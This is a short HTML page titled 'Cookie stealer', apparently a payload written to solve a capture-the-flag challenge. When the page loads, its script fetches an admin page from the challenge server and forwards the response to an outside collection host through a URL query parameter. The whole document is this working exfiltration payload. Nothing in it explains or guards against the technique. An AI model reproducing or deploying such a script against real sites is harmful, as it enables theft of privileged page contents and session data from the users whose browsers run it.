<!DOCTYPE html>
<html>
  <head>
    <title>Cookie stealer</title>
  </head>
  <body>
    <script>
      var xmlHttp = new XMLHttpRequest();
      xmlHttp.open( "GET", "http://challenges.laptophackingcoffee.org:1337/dev.php?page=admin", false ); // false for synchronous request
      xmlHttp.send( null );
      var resp = xmlHttp.responseText;
      var xmlHttp = new XMLHttpRequest();
      var theurl = "https://lopolis-api.now.sh/?cookiz=" + encodeURI(resp);
      xmlHttp.open( "GET", theurl, false ); // false for synchronous request
      xmlHttp.send( null );
      var resp = xmlHttp.responseText;
    </script>
  </body>
</html>
